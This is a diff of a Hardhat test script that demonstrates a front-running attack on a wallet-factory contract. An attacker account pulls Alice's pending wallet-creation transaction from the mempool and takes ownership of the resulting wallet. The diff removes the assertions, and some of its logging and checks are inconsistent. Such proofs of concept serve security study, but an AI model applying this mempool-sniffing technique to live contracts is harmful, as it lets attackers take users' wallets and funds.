@@ -1,6 +1,6 @@
-const { expect } = require('chai');
-const { ethers } = require('hardhat');
-const 
+let { expect } = require('chai');
+let { ethers } = require('hardhat');
+let 
   {abi:WalletContractAbi}
  = require('../artifacts/contracts/Wallet.sol/Wallet.json');
 
@@ -9,7 +9,7 @@ const
 
   async function createTraders (){
     [owner, alice, attacker] = await ethers.getSigners();
-    const Factory = await ethers.getContractFactory('FactoryContract');
+    let Factory = await ethers.getContractFactory('FactoryContract');
     factory = await Factory.connect(owner).deploy();
 
     }
@@ -18,19 +18,19 @@ const
     async function performAttack() {
       console.log("Starting attack...\n");
     
-      const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Something'));
+      let salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Something'));
       
       console.log("Alice creating wallet...\n");
       await factory.connect(alice).createWallet(salt);
     
       console.log("Getting transactions from mempool...\n");
-      const txs = await ethers.provider.send('eth_getBlockByNumber', [
+      let txs = await ethers.provider.send('eth_getBlockByNumber', [
         'pending',
         true,
       ]);
     
       console.log("Finding Alice's transaction...\n");
-      const tx = txs.transactions.find(
+      let tx = txs.transactions.find(
         (tx) => tx.to === factory.address.toLowerCase() && 
                 tx.from === alice.address.toLowerCase()
       );
@@ -51,7 +51,7 @@ const
       await ethers.provider.send('evm_mine', []);
     
       console.log("Getting wallet address...");
-      const addressOfWallet = await factory.walletOwner(attacker.address);
+      let addressOfWallet = await factory.walletOwner(attacker.address);
       console.log("Wallet address:", addressOfWallet);
     
       if (addressOfWallet === ethers.constants.AddressZero) {
@@ -60,7 +60,7 @@ const
       }
     
       console.log("Getting wallet contract...\n");
-      const wallet = await ethers.getContractAt(
+      let wallet = await ethers.getContractAt(
         WalletContractAbi,
         addressOfWallet,
         attacker
@@ -69,18 +69,44 @@ const
 
     
       console.log("Checking results...\n");
-      const aliceWallet = await factory.walletOwner(alice.address);
-      const walletOwner = await wallet.owner();
-      const isInitialized = await wallet.initialized();
+      let aliceWallet = await factory.walletOwner(alice.address);
+      let walletOwner = await wallet.owner();
+      let isInitialized = await wallet.initialized();
     
       console.log("Alice's wallet:", aliceWallet);
       console.log("Attacker's address:", attacker.address)
       console.log("Wallet owner:", walletOwner);
       console.log("Wallet address:", isInitialized);
+
+
+
     
-      expect(aliceWallet).to.eq(ethers.constants.AddressZero);
-      expect(walletOwner).to.eq(attacker.address);
-      expect(isInitialized).to.eq(true);
+      // Alice trying to create a Wallet unaware of front running
+      console.log("Mining transactions after front running...\n");
+      await ethers.provider.send('evm_mine', []);
+    
+      if (addressOfWallet === ethers.constants.AddressZero) {
+        console.log("Attack failed: No wallet created for attacker");
+        return;
+      }
+    
+      console.log("Getting wallet contract...\n");
+      wallet = await ethers.getContractAt(
+        WalletContractAbi,
+        addressOfWallet,
+        alice
+      );
+    
+
+    
+      console.log("Checking results...\n");
+      aliceWallet = await factory.walletOwner(alice.address);
+      walletOwner = await wallet.owner();
+      isInitialized = await wallet.initialized();
+    
+      console.log("Alice's wallet:", aliceWallet);
+      console.log("Wallet owner:", walletOwner);
+      console.log("Wallet address:", isInitialized);
     }
 
 async function startAttack(){
